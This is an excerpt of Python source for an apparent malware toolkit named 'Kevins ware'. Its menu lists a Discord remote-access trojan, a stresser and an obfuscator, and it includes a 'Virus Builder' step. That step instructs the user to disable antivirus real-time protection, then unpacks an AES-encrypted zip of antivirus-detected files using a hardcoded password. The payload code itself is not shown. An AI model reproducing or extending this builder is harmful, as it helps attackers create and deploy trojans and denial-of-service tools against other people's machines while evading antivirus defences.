...
option_32 = "Python-Obfuscator"
option_33 = "Discord-Rat"
option_34 = "Stresser"
...
def Update():
   ...
   try:
      ...
      if new_version != version_tool:
         webbrowser.open(f"https://github.com/ns-demon/Kevins-ware")
         colorama.init()
...
while True:
   try:
      ...
      choice = input(MainColor(f""" ┌──({white}{username_pc}@Kevins_ware)─{red}[{white}~/{os_name}/Menu-{menu_number}]
 └─{white}$ {reset}"""))
      ...
      if choice in ['N', 'n', 'NEXT', 'Next', 'next']:
         ...
         if os_name == "Linux":
            ...
            messagebox.showinfo(f"Kevins ware {version_tool} - Virus Builder", "The builder virus is only compatible with Windows, under Linux it can encounter big problems.")
         ...
         messagebox.showinfo(f"Kevins ware {version_tool} - Virus Builder", "It is important to disable your antivirus (Real-time Protection) before building, so that no files are deleted.")
         try:
            zip_file_path = os.path.join(tool_path, "Program", "FileDetectedByAntivirus", "Password(Kevins ware).zip")
            ...
            if not os.path.exists(file_path):
               if os.path.exists(zip_file_path):
                  print(f"{BEFORE + current_time_hour() + AFTER} {INFO} Decompression of the encrypted file: {white}Program\\FileDetectedByAntivirus\\Password(Kevins ware).zip")
                  with pyzipper.AESZipFile(zip_file_path) as zf:
                     zf.pwd = b'Kevins ware'
